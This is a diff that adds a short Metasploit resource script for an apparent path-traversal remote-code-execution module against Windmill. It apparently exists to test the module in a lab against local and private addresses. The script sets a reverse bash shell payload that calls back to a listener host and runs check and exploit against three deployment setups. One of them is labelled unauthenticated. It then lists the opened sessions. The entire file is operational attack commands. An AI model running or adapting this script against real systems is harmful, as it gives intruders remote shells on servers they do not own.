@@ -1,0 +1,30 @@
+# =============================================
+# exploit/linux/http/windmill_path_traversal_rce
+# =============================================
+
+use exploit/linux/http/windmill_path_traversal_rce
+set payload cmd/unix/reverse_bash
+set LHOST 172.17.0.1
+
+# --- Standalone via SUPERADMIN_SECRET ---
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+check
+exploit -z
+
+# --- Flow Proxy (UNAUTHENTICATED!) ---
+set RHOSTS localhost.local
+set RPORT 443
+set SSL true
+check
+exploit -z
+
+# --- Flow Direct ---
+set RHOSTS 172.23.0.10
+set RPORT 8000
+set SSL false
+check
+exploit -z
+
+sessions -l
